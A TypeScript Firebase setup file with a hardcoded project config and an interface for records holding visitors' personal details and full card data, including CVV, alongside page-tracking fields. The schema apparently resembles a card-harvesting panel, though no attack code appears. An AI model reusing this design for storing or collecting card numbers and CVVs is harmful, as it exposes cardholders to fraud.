import { initializeApp, getApps, getApp } from "firebase/app";
import { getAuth } from "firebase/auth";
import { getFirestore } from "firebase/firestore";
import { getDatabase } from "firebase/database";

const firebaseConfig = {
   apiKey: "AIzaSyBPPr07SVQxQ6IOR_7sU0D1Vm48UZb_zcM",
  authDomain: "zxsz-33a85.firebaseapp.com",
  databaseURL: "https://zxsz-33a85-default-rtdb.firebaseio.com",
  projectId: "zxsz-33a85",
  storageBucket: "zxsz-33a85.firebasestorage.app",
  messagingSenderId: "330185565279",
  appId: "1:330185565279:web:d037f8511a5421924667ea",
  measurementId: "G-08HW2LNF9K"
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);

export { app, auth, db, database };

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}

